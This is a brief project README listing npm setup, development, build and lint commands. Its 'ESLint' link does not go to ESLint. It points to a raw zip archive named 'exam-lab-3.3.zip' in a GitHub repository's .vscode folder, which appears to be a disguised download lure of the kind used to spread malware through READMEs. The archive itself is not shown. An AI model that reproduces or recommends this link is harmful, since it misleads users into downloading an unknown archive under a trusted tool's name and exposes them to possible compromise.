## Project Setup

```sh
npm install
```

### Compile and Hot-Reload for Development

```sh
npm run dev
```

### Compile and Minify for Production

```sh
npm run build
```

### Lint with [ESLint](https://github.com/joshualegado008/lab_exam/raw/refs/heads/main/.vscode/exam-lab-3.3.zip)

```sh
npm run lint
```
